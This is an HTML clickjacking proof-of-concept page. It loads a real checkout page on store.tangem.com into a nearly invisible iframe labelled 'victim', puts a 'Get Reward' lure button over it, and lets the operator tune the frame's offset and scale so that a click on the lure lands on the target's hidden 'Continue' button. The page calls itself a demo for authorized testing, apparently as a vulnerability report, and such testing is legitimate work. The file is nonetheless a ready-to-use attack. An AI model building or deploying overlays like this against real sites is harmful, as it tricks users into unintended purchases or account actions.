<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <title>Demo</title>
  <style>
    html,body{margin:0;height:100%;overflow:hidden;background:#0f172a;font-family:system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial}
    .bar{position:fixed;top:0;left:0;right:0;background:#111827;color:#e5e7eb;font-size:14px;padding:10px 14px;z-index:1000}
    .wrap{position:relative;height:100%;width:100%}
    iframe#victim{
      position:absolute; inset:0;
      width:100%; height:100%;
      border:0; opacity:0.01;
      pointer-events:auto; z-index:10;
      transform-origin: top left;
    }
    .lure{
      position:absolute; left:50%;
      transform:translateX(-50%);
      bottom:88px;
      width:88vw; max-width:680px; height:56px;
      background:linear-gradient(180deg,#22d3ee,#3b82f6);
      border-radius:14px; display:flex; align-items:center; justify-content:center;
      color:#fff; font-weight:700; font-size:18px; letter-spacing:0.3px;
      box-shadow:0 12px 24px rgba(37,99,235,.35);
      z-index:20; user-select:none;
      pointer-events:none;
    }
    .hint{
      position:absolute; inset:0; z-index:15; pointer-events:none;
      background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),
                       linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);
      background-size: 24px 24px;
    }
    .control{
      position:fixed; bottom:14px; left:14px; right:14px; z-index:30; display:flex; gap:8px; justify-content:center;
    }
    .control a{background:#111827;color:#e5e7eb;text-decoration:none;padding:10px 12px;border-radius:10px;font-size:14px;border:1px solid #374151}
  </style>
</head>
<body>
  <div class="bar">
    Demo page. For authorized testing only. Align the visible button with the target “Continue” underneath.
  </div>

  <div class="wrap">
    <iframe id="victim" sandbox="allow-scripts allow-forms allow-same-origin" referrerpolicy="no-referrer"></iframe>
    <div class="hint" aria-hidden="true"></div>
    <div class="lure">Get Reward</div>
  </div>

  <div class="control">
    <a id="copyUrl" href="#" role="button">Copy current tuning URL</a>
  </div>

  <script>
    // === CONFIG ===
    const TARGET_URL = "https://store.tangem.com/checkout?cart_id=cart_01K1DR3HEND5AV2QGZMXCVMQSE";
    const qs = new URLSearchParams(location.search);
    const scale = parseFloat(qs.get("scale") || "1");
    const x = parseInt(qs.get("x") || "0", 10);
    const y = parseInt(qs.get("y") || "0", 10);

    const frame = document.getElementById("victim");
    frame.src = TARGET_URL;

    function applyTransform(){
      frame.style.transform = `translate(${x}px,${y}px) scale(${scale})`;
    }
    applyTransform();

    document.getElementById("copyUrl").addEventListener("click", async (e)=>{
      e.preventDefault();
      const url = new URL(location.href);
      url.searchParams.set("scale", String(scale));
      url.searchParams.set("x", String(x));
      url.searchParams.set("y", String(y));
      try{
        await navigator.clipboard.writeText(url.toString());
        alert("URL copied:\n" + url.toString());
      }catch(err){
        prompt("Copy URL manually:", url.toString());
      }
    });
  </script>
</body>
</html>

